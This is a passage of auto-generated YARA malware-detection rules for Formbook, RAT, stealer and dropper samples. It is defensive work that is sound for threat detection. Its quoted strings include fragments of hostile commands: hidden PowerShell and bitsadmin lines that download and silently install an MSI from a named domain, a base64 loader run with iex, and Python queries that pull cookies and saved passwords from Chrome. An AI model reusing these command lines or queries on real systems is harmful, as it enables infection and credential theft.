      $s7 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%WEuyogNS%%dAntIrqL%%HybCcosk% %sdqZxwXd% %LdpHInNi%%oYsjuewr% %MuzppFgM%%temp%%MokQwW" ascii /* score: '18.00'*/
      $s8 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%WEuyogNS%%dAntIrqL%%HybCcosk% %sdqZxwXd% %LdpHInNi%%gfsnVBmS%%wpspSvzN% %MuzppFgM%%te" ascii /* score: '18.00'*/
      $s9 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%iGafwqvy%%rxuTBOmc%%HybCcosk% %sdqZxwXd% %LdpHInNi%%oYsjuewr% %MuzppFgM%%temp%%tdFkVg" ascii /* score: '18.00'*/
      $s10 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%iGafwqvy%%rxuTBOmc%%HybCcosk% %sdqZxwXd% %RpByHLqb%%wpspSvzN% %MuzppFgM%%temp%%AYFgQo" ascii /* score: '18.00'*/
      $s11 = "%sdqZxwXd% %RpByHLqb%%wpspSvzN% %appdata%%QcUSmMXT%%BtXbxdlC%%lLXXlive%%rTSsZVfK%%MbJRvvgh%%XAsJmGpQ% %xqQdzOiS%%QwMoNKst% %uyMs" ascii /* score: '18.00'*/
      $s12 = "xdKK% %diNFTRfH% %appdata%%HiVNQtHS%%awCTWhLU%%vzzLTeQm%%LnHQjjkn%%TsWHptVE%%TgfqcbxU%%twauNYzy%" fullword ascii /* score: '18.00'*/
      $s13 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%iGafwqvy%%UQLDkhNg%%JbDzTdOk%%MuzppFgM% %sdqZxwXd% %ObbPWxrc%%nnaqyDMS% %MuzppFgM%%te" ascii /* score: '18.00'*/
      $s14 = "%sdqZxwXd% %RpByHLqb%%wpspSvzN% %appdata%%QcUSmMXT%%BtXbxdlC%%lLXXlive%%rTSsZVfK%%MbJRvvgh%%XAsJmGpQ% %xqQdzOiS%%QwMoNKst% %uyMs" ascii /* score: '18.00'*/
      $s15 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%WEuyogNS%%dLYOHFAc%%JbDzTdOk%%MuzppFgM% %sdqZxwXd% %RpByHLqb%%wpspSvzN% %MuzppFgM%%te" ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__b7c1a2f0 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b7c1a2f0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b7c1a2f05b74613f8ff47d40c0a8562121bfb97482421c4475355b9ccd53c866"
   strings:
      $s1 = "Protego.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://checkip.amazonaws.com" fullword wide /* score: '21.00'*/
      $s3 = "uploadfile" fullword wide /* PEStudio Blacklist: strings */ /* score: '15.00'*/
      $s4 = "Cmd mode enabled, all commands will be redirect to CMD. Response delay is : " fullword wide /* score: '14.00'*/
      $s5 = "Command not found, you may need to enable CMD mode <enablecmd or enable cmd>" fullword wide /* score: '14.00'*/
      $s6 = "_parseCommand" fullword ascii /* score: '12.00'*/
      $s7 = "_getCommand" fullword ascii /* score: '12.00'*/
      $s8 = "_getUser" fullword ascii /* score: '12.00'*/
      $s9 = "commandRetrieveUri" fullword ascii /* score: '12.00'*/
      $s10 = "File transfer operation failed." fullword wide /* score: '12.00'*/
      $s11 = "File (inmem) transfer operation failed." fullword wide /* score: '12.00'*/
      $s12 = "checkercmd" fullword ascii /* score: '11.00'*/
      $s13 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion" fullword wide /* score: '11.00'*/
      $s14 = "enablecmd" fullword wide /* score: '11.00'*/
      $s15 = "https://api.ipify.org" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 80KB and
      8 of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6801cdec {
   meta:
      description = "_subset_batch - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6801cdec.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6801cdec8d0c5f815604035ebe50787b42c69bd3a7fab6d9b78d5ee5afd3c511"
   strings:
      $s1 = "PAYMENT.exe" fullword wide /* score: '22.00'*/
      $s2 = "{9bb07583-7338-4895-86ee-2b55a78f4e4b}, PublicKeyToken=3e56350693f7355e" fullword wide /* score: '13.00'*/
      $s3 = "HkAS.TwI=" fullword ascii /* score: '10.00'*/
      $s4 = "Selected compression algorithm is not supported." fullword wide /* score: '10.00'*/
      $s5 = "Unknown Header" fullword wide /* score: '9.00'*/
      $s6 = ":=`$~3#[d" fullword ascii /* score: '9.00'*/ /* hex encoded string '=' */
      $s7 = "SmartAssembly.Attributes" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
      $s8 = "pezcvj+ " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__02430729 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_02430729.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0243072928c8b2539778a16d86762dc3714b38e663580fb74f4bd6cd2a9825c0"
   strings:
      $s1 = "Lkoqmjvse.exe" fullword wide /* score: '22.00'*/
      $s2 = "iUpJnd+69GFfj9ayuUdThtT5m0BJjNe1tkoBrt+jn11Om8OWqUBfhNi7owhdjM6InEZWhfS2t1YBhsqIk11fmM+2tlpOkIGwv0dlpd+5vUdS0v2yrmdDmd+RqFxXodu5" wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2abfbc6e {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2abfbc6e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2abfbc6eaaeba2bc993cf1076104519493692679caa432a19b75914a000a09e5"
   strings:
      $s1 = "asyn.exe" fullword wide /* score: '22.00'*/
      $s2 = "xy2IMYKhugaeI4up9yCSKoni1SeIIIqu+C3AAoK40TqPN56N5yeeKIWg7W+cIJOT0iGXKamt+THAKpeT3TqeNJKt+D2PPNyr8SCkCYKi8yCTfqCp4ACCNYKK5juWDYai" wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5619051c {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5619051c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5619051c90bedc4a1af4f134d2e5ce60986dd838f264fa83833a7bd1aac9f125"
   strings:
      $s1 = "915rc.exe" fullword wide /* score: '19.00'*/
      $s2 = "ukxFcB/Ox2dTYhbGikFfaxSNqEZFYRfBhUwNQx/XrFtCdgPimkZTaRjPkA5RYQ78r0BaaDTChFANawr8oFtTdQ/ChVxCfUHEjEFpSB/NjkFePz3GnWFPdB/lm1pbTBvN" wide /* score: '11.00'*/
      $s3 = "* a R8" fullword ascii /* score: '9.00'*/
      $s4 = "* ?H3?<" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d65eb688 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d65eb688.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d65eb6882fa89eefc84f94bed68af0d163d05a0421d9e5346bb5fb7880ca483d"
   strings:
      $s1 = "Yqkqa.exe" fullword wide /* score: '22.00'*/
      $s2 = "get_MaxDecompressedBytes" fullword ascii /* score: '12.00'*/
      $s3 = "m_AlphabeticCommand" fullword ascii /* score: '12.00'*/
      $s4 = "TraverseIdentifiableIterator" fullword ascii /* score: '12.00'*/
      $s5 = "_ActiveDecryptor" fullword ascii /* score: '11.00'*/
      $s6 = "get_Decrypted" fullword ascii /* score: '11.00'*/
      $s7 = "get_HeaderSizeBytes" fullword ascii /* score: '9.00'*/
      $s8 = "GetNextAdaptableIterator" fullword ascii /* score: '9.00'*/
      $s9 = "TraverseExtendedIterator" fullword ascii /* score: '9.00'*/
      $s10 = "get_Kwgofjapq" fullword ascii /* score: '9.00'*/
      $s11 = "m_AccessibleIteratorContent" fullword ascii /* score: '9.00'*/
      $s12 = "SubmitOperationalTransmitter" fullword ascii /* score: '9.00'*/
      $s13 = "Decompressed" fullword ascii /* score: '9.00'*/
      $s14 = "EncryptIterator" fullword ascii /* score: '9.00'*/
      $s15 = "set_HeaderSizeBytes" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9d6b9c55 {
   meta:
      description = "_subset_batch - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9d6b9c55.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9d6b9c55919d028b4e3f6a031bc6c60a06f4b8963ffc9810f7604f01bf5128d8"
   strings:
      $s1 = "Intasuranfe.exe" fullword wide /* score: '22.00'*/
      $s2 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s3 = "PENDIENTE" fullword wide /* base64 encoded string '<CC CS' */ /* score: '16.50'*/
      $s4 = "SELECT test.TES_ID, CASE when TES_TIPO = 'Examen' then  ('** ' + TES_NOMBRE + ' **') when TES_TIPO = 'Parametro' then  ('  --> '" wide /* score: '16.00'*/
      $s5 = "select test.TES_ID, CASE when TES_TIPO = 'Examen' then  ('** ' + TES_NOMBRE + ' **') when TES_TIPO = 'Parametro' then  ('  --> '" wide /* score: '13.00'*/
      $s6 = "MyTemplate" fullword ascii /* score: '11.00'*/
      $s7 = "My.Computer" fullword ascii /* score: '11.00'*/
      $s8 = "delete from i_temp_stock;" fullword wide /* score: '11.00'*/
      $s9 = "Insert into i_temp_stock values ('" fullword wide /* score: '11.00'*/
      $s10 = "select * from tipo_autocompletar where auto_nombre = '" fullword wide /* score: '11.00'*/
      $s11 = "System.Windows.Forms.Form" fullword ascii /* score: '10.00'*/
      $s12 = "AUTOCOMPLETE" fullword wide /* score: '9.50'*/
      $s13 = "COMENTARIO" fullword wide /* score: '9.50'*/
      $s14 = "REPORTADO" fullword wide /* score: '9.50'*/
      $s15 = "GetTypes" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule Formbook_signature__3 {
   meta:
      description = "_subset_batch - file Formbook(signature).img"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ce82013b6c546dcaa1c11359bddbb85c3ff329ffb93a9a997b4e69b4d72b9d5e"
   strings:
      $s1 = "PRE-ALERT ==HTHC22031529.exe" fullword wide /* score: '19.00'*/
      $s2 = "ExecuteSynchronousFlow" fullword ascii /* score: '18.00'*/
      $s3 = "InvokeTargetMethod" fullword ascii /* score: '18.00'*/
      $s4 = "ExecutionFlowController" fullword ascii /* score: '16.00'*/
      $s5 = "CryptographicProcessor" fullword ascii /* score: '15.00'*/
      $s6 = "AssemblyExecutionEngine" fullword ascii /* score: '12.00'*/
      $s7 = "PRE_ALERT___HTHC22031529.EXE;1" fullword ascii /* score: '11.00'*/
      $s8 = "<PRE-ALERT ==HTHC22031529.exe;1" fullword wide /* score: '11.00'*/
      $s9 = "TransformEncryptedData" fullword ascii /* score: '9.00'*/
      $s10 = "get_Znfjffuol" fullword ascii /* score: '9.00'*/
      $s11 = "encryptionIv" fullword ascii /* score: '9.00'*/
      $s12 = " /h/.sCg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x0000 and filesize < 3000KB and
      8 of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4a880e52 {
   meta:
      description = "_subset_batch - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4a880e52.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4a880e52c3e1d5d7857a6b81bd13e61e35c3111be7a5555a4f1fa5a7b5e938b0"
   strings:
      $s1 = "6841059370.exe" fullword wide /* score: '19.00'*/
      $s2 = "ExecuteSynchronousFlow" fullword ascii /* score: '18.00'*/
      $s3 = "InvokeTargetMethod" fullword ascii /* score: '18.00'*/
      $s4 = "ExecutionFlowController" fullword ascii /* score: '16.00'*/
      $s5 = "CryptographicProcessor" fullword ascii /* score: '15.00'*/
      $s6 = "AssemblyExecutionEngine" fullword ascii /* score: '12.00'*/
      $s7 = "TransformEncryptedData" fullword ascii /* score: '9.00'*/
      $s8 = "encryptionIv" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__97d201fd {
   meta:
      description = "_subset_batch - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_97d201fd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "97d201fd1295bd1ca922149d4c02a03d68713a207f853d1fbcc8c280567f64e1"
   strings:
      $s1 = "PRE-ALERT ==HTHC22031529.exe" fullword wide /* score: '19.00'*/
      $s2 = "ExecuteSynchronousFlow" fullword ascii /* score: '18.00'*/
      $s3 = "InvokeTargetMethod" fullword ascii /* score: '18.00'*/
      $s4 = "ExecutionFlowController" fullword ascii /* score: '16.00'*/
      $s5 = "CryptographicProcessor" fullword ascii /* score: '15.00'*/
      $s6 = "AssemblyExecutionEngine" fullword ascii /* score: '12.00'*/
      $s7 = "TransformEncryptedData" fullword ascii /* score: '9.00'*/
      $s8 = "get_Znfjffuol" fullword ascii /* score: '9.00'*/
      $s9 = "encryptionIv" fullword ascii /* score: '9.00'*/
      $s10 = " /h/.sCg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule e983537912c65135a5bfc260a0458a95dcb78a9fdd1c67089314dbc416e7439f_e9835379 {
   meta:
      description = "_subset_batch - file e983537912c65135a5bfc260a0458a95dcb78a9fdd1c67089314dbc416e7439f_e9835379.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e983537912c65135a5bfc260a0458a95dcb78a9fdd1c67089314dbc416e7439f"
   strings:
      $x1 = "msiexec.exe /i \"%TEMP_MSI%\" /quiet /norestart >nul 2>&1" fullword ascii /* score: '46.00'*/
      $x2 = "powershell.exe -WindowStyle Hidden -Command \"& {$w = New-Object System.Net.WebClient; $w.DownloadFile('%URL%', '%TEMP_MSI%'); $" ascii /* score: '43.00'*/
      $x3 = "powershell.exe -WindowStyle Hidden -Command \"& {Invoke-WebRequest -Uri '%URL%' -OutFile '%TEMP_MSI%' -UseBasicParsing}\" >nul 2" ascii /* score: '43.00'*/
      $x4 = "powershell.exe -WindowStyle Hidden -Command \"& {Invoke-WebRequest -Uri '%URL%' -OutFile '%TEMP_MSI%' -UseBasicParsing}\" >nul 2" ascii /* score: '43.00'*/
      $x5 = "powershell.exe -WindowStyle Hidden -Command \"& {$w = New-Object System.Net.WebClient; $w.DownloadFile('%URL%', '%TEMP_MSI%'); $" ascii /* score: '43.00'*/
      $s6 = "bitsadmin /transfer \"DownloadMSI\" /priority HIGH \"%URL%\" \"%TEMP_MSI%\" >nul 2>&1" fullword ascii /* score: '28.00'*/
      $s7 = "    powershell \"Start-Process cmd -Args '/c \\\"%~f0\\\"' -Verb RunAs -WindowStyle Hidden\" >nul 2>&1" fullword ascii /* score: '23.00'*/
      $s8 = "if exist \"%TEMP_MSI%\" del /q \"%TEMP_MSI%\" >nul 2>&1" fullword ascii /* score: '23.00'*/
      $s9 = "set \"TEMP_MSI=%TEMP%\\ContractViewer_Pro.msi\"" fullword ascii /* score: '22.00'*/
      $s10 = "if exist \"%TEMP_MSI%\" (" fullword ascii /* score: '15.00'*/
      $s11 = "del \"%TEMP_MSI%\" >nul 2>&1" fullword ascii /* score: '15.00'*/
      $s12 = "set \"URL=https://notas-tabeliao.org/ContractViewer_Pro.msi\"" fullword ascii /* score: '14.00'*/
      $s13 = ":: Limpa arquivo tempor" fullword ascii /* score: '11.00'*/
      $s14 = "    for %%F in (\"%TEMP_MSI%\") do set \"FILESIZE=%%~zF\"" fullword ascii /* score: '10.00'*/
      $s15 = "        del \"%TEMP_MSI%\" >nul 2>&1" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 5KB and
      1 of ($x*) and all of them
}

rule f4b8d2482ef414f738a7f4fa2082f39ddf2f24159391eeea14cce0d1752aed0f_f4b8d248 {
   meta:
      description = "_subset_batch - file f4b8d2482ef414f738a7f4fa2082f39ddf2f24159391eeea14cce0d1752aed0f_f4b8d248.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f4b8d2482ef414f738a7f4fa2082f39ddf2f24159391eeea14cce0d1752aed0f"
   strings:
      $x1 = "echo ucjpjwiraqemnhovqlogincupywpxxhlziwqzzobidsshysldcouhslfhjaqhrcyqrnesqaxexyabjtvbecltraycjxnpbrlhaphifofnjmpdsluvqjcofwzumg" ascii /* score: '65.00'*/
      $s2 = "~f0' -ArgumentList elevated -Verb RunAs\"" fullword ascii /* score: '23.00'*/
      $s3 = "%VAR0:~48,1%%VAR0:~48,1%%VAR0:~48,1%%VAR0:~48,1%%VAR0:~32,1%%VAR0:~0,1%%VAR0:~44,1%%VAR0:~22,1%%VAR0:~40,1%%VAR0:~60,1%%VAR0:~46" ascii /* score: '23.00'*/
      $s4 = "wbkbswvokmunuaoihwtcvadysxvrcxdlhegobzpddujietfussmtpjxhrztouhvsyhuwpmaloggdlpslatvborllrnytvuwrakiydhtunzpulepmfbzwphljghfvwcdo" ascii /* score: '18.00'*/
      $s5 = "sgbibdirtismgfswkfumehjaowpddvrluelusvgncsolsoetdfsczqzzlvevilogapsapcromlilveqznaymbskwacxfhsefuuhpujdtgolefyytbqhvmbtgxkkdtowd" ascii /* score: '18.00'*/
      $s6 = "yomodgnrzoxsfmlxuvvccnrkmowsjgqzqdjwvhctvcgyqeecceqjftpxkuvvgdmiekqmfewmmixohdfjwfteqyegeyejbpxanknmgwerpusfxtjxwymndjbqbgzmqlru" ascii /* score: '18.00'*/
      $s7 = "cqcudljkwypnikmqzfamhqmkhioqafvhkvzwtyzcklvakdtiqnzylogetbmntkxcxoyvthgifogwqlkxtzwedxlmoykzsneqkhxkzuzhgoisexsgzyggnttsyewnfaco" ascii /* score: '18.00'*/
      $s8 = "qdddgzisqczitafzdmovdgrpaejpwntqgmccqloggfhbuazusjghdftkpvjhigkyorjxqgadgemgxiezvszdfggkatziumesqlsrigbiqejucqyidakpblcqeatvnext" ascii /* score: '17.00'*/
      $s9 = "echo ucjpjwiraqemnhovqlogincupywpxxhlziwqzzobidsshysldcouhslfhjaqhrcyqrnesqaxexyabjtvbecltraycjxnpbrlhaphifofnjmpdsluvqjcofwzumg" ascii /* score: '17.00'*/
      $s10 = "eqdicfzkejgetsahwifbugsezyijrhmiakyzcltkyzidhvosqkgoqjaljgfqnsvjjtwrbvmtblqofxcpmdmlxghvvwejkjfonemlrdamfwleimfhzresuagpqkttmprr" ascii /* score: '16.00'*/
      $s11 = "qclwgyhmirtmkctlygezioqnjzoulkdvsdndyevtaomqnvplybccxlfamaucozvnpknkeeyypmnwkeyeinzbqqwkxewgoffxdcsbnforllumdgtcjnpgxzxlmbdhtmch" ascii /* score: '16.00'*/
      $s12 = "lkuegmlkaeoqrocmejdlybfblvmycnhjrtdccpaoeurrzveestkvzpompqguecomjjrlqpqoydntqshwjrmfseyefkdhvzmiuzazejeluwtmbidwsckbvzeeswfgifvb" ascii /* score: '16.00'*/
      $s13 = "czccxxkvpbokjkjjkkykrtjajhsoftfmncpvsfdzypbaobdnfjytaobrjwjfgtzeriuvkircidjnsnsorxhekeygfulgqwfsbjxaffvyrabhmixlcfamsukebtnbfguy" ascii /* score: '16.00'*/
      $s14 = "djqeibrntwujxarohvessqlcgljpoerlkgcvroqjhgiwrqowapbimkeynqfkqatxcbphbkqdhxbenrpgnyynsbmfhpoxiptfncftpcthctzuvwrbutfnscihtcjmnkmz" ascii /* score: '16.00'*/
      $s15 = "knvxhznzuhpdzepjbgnvkphuhmxcoxojlqygidcnuxssjdrzczkdecmucnbnlsgwnypzgogasndspylgsofmvosvtkgrlhkjpleemlryjpcfwrwlrqnpxzqmfovcmdev" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6365 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule f4e4d56ad6ca6692282ad8e0a1504db967da56f5097510b4f731b4ce229ccb6e_f4e4d56a {
   meta:
      description = "_subset_batch - file f4e4d56ad6ca6692282ad8e0a1504db967da56f5097510b4f731b4ce229ccb6e_f4e4d56a.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f4e4d56ad6ca6692282ad8e0a1504db967da56f5097510b4f731b4ce229ccb6e"
   strings:
      $x1 = "=powershell -Command \"Start-Process powershell -WindowStyle Hidden -Argument" fullword ascii /* score: '33.00'*/
      $s2 = "=code.GetString^([system.convert]::Frombase64string^($sofigo.replace^(''d@'','" fullword ascii /* score: '16.00'*/
      $s3 = "=LgBjAG8ALwA3AGQAYgBHAEsAdwBYAFoALwBpAG0AYQBnAGUALgBqAHAAZwA/ADEAMgA3ADEAMQAzADQ" fullword ascii /* base64 encoded string '. c o / 7 d b G K w X Z / i m a g e . j p g ? 1 2 7 1 1 3 4' */ /* score: '14.00'*/
      $s4 = "=AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQ" fullword ascii /* base64 encoded string ' s t e m . T e x t . E n c o d i n g ] : : U T F 8 . G e t S t' */ /* score: '14.00'*/
      $s5 = "=List '-Command \\\"$sofigo = ''IAAgACAAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkA" fullword ascii /* score: '12.00'*/
      $s6 = "='c''^)^)^);iex $OWjuxD\\\"'\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 30KB and
      1 of ($x*) and all of them
}

rule e9de35de80c4416dfc060a4ecd21f490cc9a0eb3bf67f71a21353d6fb277e342_e9de35de {
   meta:
      description = "_subset_batch - file e9de35de80c4416dfc060a4ecd21f490cc9a0eb3bf67f71a21353d6fb277e342_e9de35de.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e9de35de80c4416dfc060a4ecd21f490cc9a0eb3bf67f71a21353d6fb277e342"
   strings:
      $s1 = "        var unpicked = captivating.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '17.00'*/
      $s2 = "        var nanomachinery = captivating.Get(\"Win32_Process\");" fullword ascii /* score: '14.00'*/
      $s3 = "        this[\"recapitulated\"] = this[\"eaglet\"].GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '10.00'*/
      $s4 = "g('\" + this[\"preparsed\"] + \"'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule Formbook_signature__b5d7307f {
   meta:
      description = "_subset_batch - file Formbook(signature)_b5d7307f.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b5d7307fbbad84cf2ecd8b6f48190241c0b5b6e18445570a12d914e69b7ea0ab"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule ed0c46d7dbf086afe20110b2baaeb0ea69b0fc527334571dd449b148c81d6b2c_ed0c46d7 {
   meta:
      description = "_subset_batch - file ed0c46d7dbf086afe20110b2baaeb0ea69b0fc527334571dd449b148c81d6b2c_ed0c46d7.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ed0c46d7dbf086afe20110b2baaeb0ea69b0fc527334571dd449b148c81d6b2c"
   strings:
      $s1 = "Dd1d1d1Zb" fullword ascii /* base64 encoded string 'wWuwV[' */ /* score: '11.00'*/
      $s2 = "* sZ2y" fullword ascii /* score: '9.00'*/
      $s3 = "* 25mj" fullword ascii /* score: '9.00'*/
      $s4 = "* {\\@x" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 3000KB and
      all of them
}

rule ed3ccaa4261233f7760f67e73bb23963e0cfc0c53efe2440ae7c173179f54fdf_ed3ccaa4 {
   meta:
      description = "_subset_batch - file ed3ccaa4261233f7760f67e73bb23963e0cfc0c53efe2440ae7c173179f54fdf_ed3ccaa4.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ed3ccaa4261233f7760f67e73bb23963e0cfc0c53efe2440ae7c173179f54fdf"
   strings:
      $s1 = "# http://VirusShare.com        #" fullword ascii /* score: '19.00'*/
      $s2 = "456c4c0027" ascii /* score: '17.00'*/ /* hex encoded string 'ElL'' */
      $s3 = "7e7a233956777572" ascii /* score: '17.00'*/ /* hex encoded string '~z#9Vwur' */
      $s4 = "2c2a7457732e54772e72" ascii /* score: '17.00'*/ /* hex encoded string ',*tWs.Tw.r' */
      $s5 = "46345a2a5b51" ascii /* score: '17.00'*/ /* hex encoded string 'F4Z*[Q' */
      $s6 = "45664b5f5d5e" ascii /* score: '17.00'*/ /* hex encoded string 'EfK_]^' */
      $s7 = "# VirusShare_00000.zip         #" fullword ascii /* score: '9.00'*/
      $s8 = "# Malware sample MD5 list for  #" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2323 and filesize < 13000KB and
      all of them
}

rule ee78fd774e33e59632a1e39370c821f6374e5a19adfe60adeb296072f39a6722_ee78fd77 {
   meta:
      description = "_subset_batch - file ee78fd774e33e59632a1e39370c821f6374e5a19adfe60adeb296072f39a6722_ee78fd77.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ee78fd774e33e59632a1e39370c821f6374e5a19adfe60adeb296072f39a6722"
   strings:
      $s1 = "msvcp144.dll" fullword ascii /* score: '23.00'*/
      $s2 = "microserciasmb32rv1.exe" fullword ascii /* score: '22.00'*/
      $s3 = "VCRUNTIME140.dllPK" fullword ascii /* score: '19.00'*/
      $s4 = "api-ms-win-crt-runtime-l1-1-0.dllPK" fullword ascii /* score: '16.00'*/
      $s5 = "api-ms-win-crt-filesystem-l1-1-0.dllPK" fullword ascii /* score: '16.00'*/
      $s6 = "msvcp144.dllPK" fullword ascii /* score: '16.00'*/
      $s7 = "api-ms-win-crt-math-l1-1-0.dllPK" fullword ascii /* score: '13.00'*/
      $s8 = "api-ms-win-crt-heap-l1-1-0.dllPK" fullword ascii /* score: '13.00'*/
      $s9 = "api-ms-win-crt-string-l1-1-0.dllPK" fullword ascii /* score: '13.00'*/
      $s10 = "api-ms-win-crt-convert-l1-1-0.dllPK" fullword ascii /* score: '13.00'*/
      $s11 = "api-ms-win-crt-stdio-l1-1-0.dllPK" fullword ascii /* score: '13.00'*/
      $s12 = "jli.dllPK" fullword ascii /* score: '13.00'*/
      $s13 = "api-ms-win-crt-environment-l1-1-0.dllPK" fullword ascii /* score: '13.00'*/
      $s14 = "api-ms-win-crt-locale-l1-1-0.dllPK" fullword ascii /* score: '12.00'*/
      $s15 = "microserciasmb32rv1.exePK" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 6000KB and
      8 of them
}

rule eef9994333a636b3ed33d7f151945896868659473d64106ab67ddb1bb3ddcebc_eef99943 {
   meta:
      description = "_subset_batch - file eef9994333a636b3ed33d7f151945896868659473d64106ab67ddb1bb3ddcebc_eef99943.py"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "eef9994333a636b3ed33d7f151945896868659473d64106ab67ddb1bb3ddcebc"
   strings:
      $x1 = "extensions_folder = f\"C:\\\\Users\\\\{getpass.getuser()}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Ext" ascii /* score: '32.00'*/
      $s2 = "    cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')" fullword ascii /* score: '28.00'*/
      $s3 = "    cursor.execute('SELECT tab_url, target_path FROM downloads')" fullword ascii /* score: '26.00'*/
      $s4 = "    cursor.execute('SELECT action_url, username_value, password_value FROM logins')" fullword ascii /* score: '25.00'*/
      $s5 = "response = requests.get(f'http://ip-api.com/json/{ip_address}')" fullword ascii /* score: '25.00'*/
      $s6 = "def get_login_data(path: str, profile: str, master_key):" fullword ascii /* score: '23.00'*/
      $s7 = "def decrypt_password(buff: bytes, master_key: bytes) -> str:" fullword ascii /* score: '21.00'*/
      $s8 = "            num_passwords = login_data.count(\"Password:\")  # Compter le nombre de mots de passe dans les donn" fullword ascii /* score: '21.00'*/
